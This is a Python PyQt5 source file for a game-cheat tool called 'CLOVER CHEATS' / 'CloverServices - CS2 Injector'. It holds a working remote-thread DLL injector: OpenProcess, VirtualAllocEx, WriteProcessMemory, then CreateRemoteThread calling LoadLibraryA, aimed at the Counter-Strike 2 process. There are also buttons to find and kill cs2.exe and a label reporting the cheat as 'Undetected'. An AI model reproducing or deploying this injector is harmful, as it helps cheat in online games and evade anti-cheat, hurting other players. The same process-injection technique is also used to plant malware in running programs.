import sys
import ctypes
import psutil
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QPushButton, QLabel, QVBoxLayout, QWidget, QTextEdit, QHBoxLayout, QFileDialog, QLineEdit
)
from PyQt5.QtCore import QSize, Qt
from PyQt5.QtGui import QFont, QColor, QPalette
import os
import json

# Directory for logs and settings
SAVE_DIR = r'C:\Users\natta\OneDrive\Desktop\APILAAA'
SETTINGS_FILE = os.path.join(SAVE_DIR, 'settings.json')
LOG_FILE = os.path.join(SAVE_DIR, 'logs.txt')

# Function to inject a DLL into a target process
def inject_dll(process_id, dll_path):
    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000

    kernel32 = ctypes.windll.kernel32
    dll_len = len(dll_path)

    # Get process handle
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
    if not h_process:
        return False

    # Allocate memory for DLL path in the target process
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

    # Write the DLL path into the allocated memory
    written = ctypes.c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))

    # Get handle to kernel32.LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

    # Create a remote thread to execute LoadLibraryA with the DLL path
    thread_id = ctypes.c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id)):
        kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)
        kernel32.CloseHandle(h_process)
        return False

    # Wait for the DLL to be loaded
    ctypes.windll.kernel32.WaitForSingleObject(thread_id, -1)

    # Clean up
    kernel32.VirtualFreeEx(h_process, arg_address, 0, 0x8000)
    kernel32.CloseHandle(h_process)

    return True

# Function to find process ID by name
def find_process_id(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return proc.info['pid']
    return None

# Function to kill CS2 process
def kill_cs2():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == "cs2.exe":
            proc.kill()
            return True
    return False

# Function to find the path of CS2.exe process
def find_cs2_path():
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        if proc.info['name'] == "cs2.exe":
            return proc.info['exe']
    return None

# Main window for the injector UI
class CloverInjectorApp(QMainWindow):
    def __init__(self):
        super().__init__()

        # Set up the window
        self.setWindowTitle("CloverServices - CS2 Injector")
        self.setFixedSize(QSize(700, 550))

        # Set custom colors (purple, gray, and black)
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(20, 20, 30))  # Dark purple
        palette.setColor(QPalette.Button, QColor(60, 60, 70))  # Gray
        palette.setColor(QPalette.ButtonText, QColor(230, 230, 250))  # Light purple text
        palette.setColor(QPalette.WindowText, QColor(230, 230, 250))  # Light purple text
        self.setPalette(palette)

        # Layout setup
        layout = QVBoxLayout()

        # Clover Cheats Big Label without Shadow
        self.title_label = QLabel("CLOVER CHEATS")
        self.title_label.setFont(QFont("Arial", 32, QFont.Bold))
        self.title_label.setStyleSheet("color: #E0BBFF;")  # Light purple
        self.title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.title_label)

        # CS2 Path
        self.cs2_path_label = QLabel("CS2 Path: Not Found")
        self.cs2_path_label.setFont(QFont("Arial", 14))
        self.cs2_path_label.setStyleSheet("color: #E0BBFF;")  # Light purple
        self.cs2_path_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.cs2_path_label)

        # "Find CS2 Path" Button
        self.find_cs2_button = QPushButton("Find CS2.exe Path")
        self.find_cs2_button.setFont(QFont("Arial", 14))
        self.find_cs2_button.setStyleSheet("background-color: #6441A5; color: #FFFFFF;")
        self.find_cs2_button.clicked.connect(self.find_cs2)
        layout.addWidget(self.find_cs2_button)

        # DLL Path input and Choose DLL button
        self.dll_path_edit = QLineEdit(self)
        self.dll_path_edit.setPlaceholderText("Enter DLL Path or Click 'Choose DLL'")
        self.dll_path_edit.setStyleSheet("background-color: #202030; color: #E0BBFF; padding: 6px; font-size: 12pt;")
        layout.addWidget(self.dll_path_edit)

        self.choose_dll_button = QPushButton("Choose DLL")
        self.choose_dll_button.setFont(QFont("Arial", 14))
        self.choose_dll_button.setStyleSheet("background-color: #6441A5; color: #FFFFFF;")
        self.choose_dll_button.clicked.connect(self.choose_dll)
        layout.addWidget(self.choose_dll_button)

        # Inject button
        self.inject_button = QPushButton("Inject DLL")
        self.inject_button.setFont(QFont("Arial", 16, QFont.Bold))
        self.inject_button.setStyleSheet("background-color: #5A2F80; color: white; padding: 10px;")
        self.inject_button.clicked.connect(self.inject_dll)
        layout.addWidget(self.inject_button)

        # Kill CS2 button
        self.kill_button = QPushButton("Kill CS2")
        self.kill_button.setFont(QFont("Arial", 16, QFont.Bold))
        self.kill_button.setStyleSheet("background-color: #8E44AD; color: white; padding: 10px;")
        self.kill_button.clicked.connect(self.kill_cs2)
        layout.addWidget(self.kill_button)

        # Status section (Red/Green for injected status)
        self.status_label = QLabel("Status: Not Injected")
        self.status_label.setFont(QFont("Arial", 14))
        self.status_label.setStyleSheet("color: red;")
        self.status_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.status_label)

        # Cheat detection status
        self.cheat_status_label = QLabel("Cheat Status: Undetected")
        self.cheat_status_label.setFont(QFont("Arial", 14))
        self.cheat_status_label.setStyleSheet("color: green;")
        self.cheat_status_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.cheat_status_label)

        # Log window (New window with logs)
        self.log_label = QLabel("Logs:")
        self.log_label.setFont(QFont("Arial", 12, QFont.Bold))
        self.log_label.setStyleSheet("color: #E0BBFF;")
        layout.addWidget(self.log_label)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet("background-color: #202030; color: #E0BBFF;")
        layout.addWidget(self.log_text)

        # Footer
        self.footer_label = QLabel("Made by @apilaa")
        self.footer_label.setFont(QFont("Arial", 10))
        self.footer_label.setStyleSheet("color: gray;")
        layout.addWidget(self.footer_label)

        # Set layout to the central widget
        central_widget = QWidget()
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

        # Load previous logs and display them
        self.load_logs()

    # Function to choose DLL file
    def choose_dll(self):
        dll_file, _ = QFileDialog.getOpenFileName(self, "Choose DLL", "", "DLL Files (*.dll)")
        if dll_file:
            self.dll_path_edit.setText(dll_file)

    # Function to kill CS2 process
    def kill_cs2(self):
        killed = kill_cs2()
        if killed:
            self.log_text.append("CS2.exe has been terminated.")
            self.status_label.setText("Status: CS2 Terminated")
            self.status_label.setStyleSheet("color: green;")
        else:
            self.log_text.append("CS2.exe was not running.")
            self.status_label.setText("Status: Not Running")
            self.status_label.setStyleSheet("color: red;")

    # Function to find CS2 executable path
    def find_cs2(self):
        cs2_path = find_cs2_path()
        if cs2_path:
            self.cs2_path_label.setText(f"CS2 Path: {cs2_path}")
            self.log_text.append(f"Found CS2.exe at: {cs2_path}")
        else:
            self.cs2_path_label.setText("CS2 Path: Not Found")
            self.log_text.append("CS2.exe not found.")

    # Function to inject DLL into CS2
    def inject_dll(self):
        cs2_pid = find_process_id("cs2.exe")
        if cs2_pid:
            dll_path = self.dll_path_edit.text()
            if dll_path:
                if inject_dll(cs2_pid, dll_path):
                    self.log_text.append(f"Successfully injected {dll_path} into CS2.exe (PID: {cs2_pid}).")
                    self.status_label.setText("Status: Injected")
                    self.status_label.setStyleSheet("color: green;")
                else:
                    self.log_text.append("Failed to inject DLL.")
                    self.status_label.setText("Status: Injection Failed")
                    self.status_label.setStyleSheet("color: red;")
            else:
                self.log_text.append("Please enter a DLL path.")
        else:
            self.log_text.append("CS2.exe is not running.")
            self.status_label.setText("Status: Not Running")
            self.status_label.setStyleSheet("color: red;")

    # Function to load logs from file
    def load_logs(self):
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = f.read()
                self.log_text.setPlainText(logs)

    # Function to save logs to file
    def save_logs(self, message):
        with open(LOG_FILE, "a") as f:
            f.write(f"{message}\n")

# Function to save settings
def save_settings(settings):
    with open(SETTINGS_FILE, "w") as f:
        json.dump(settings, f)

# Function to load settings
def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "r") as f:
            return json.load(f)
    return {}

# Main entry point
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CloverInjectorApp()
    window.show()
    sys.exit(app.exec_())
